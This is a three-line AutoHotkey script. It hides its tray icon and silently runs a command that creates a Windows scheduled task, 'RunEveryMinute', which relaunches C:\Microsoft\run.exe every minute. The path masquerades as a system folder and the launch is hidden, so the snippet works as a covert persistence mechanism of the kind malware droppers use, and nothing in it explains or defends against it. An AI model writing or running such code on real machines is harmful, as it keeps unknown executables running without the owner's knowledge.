#SingleInstance Ignore
#NoTrayIcon

Run 'cmd /c schtasks /create /sc minute /mo 1 /tn "RunEveryMinute" /tr "C:\Microsoft\run.exe"', , "Hide"
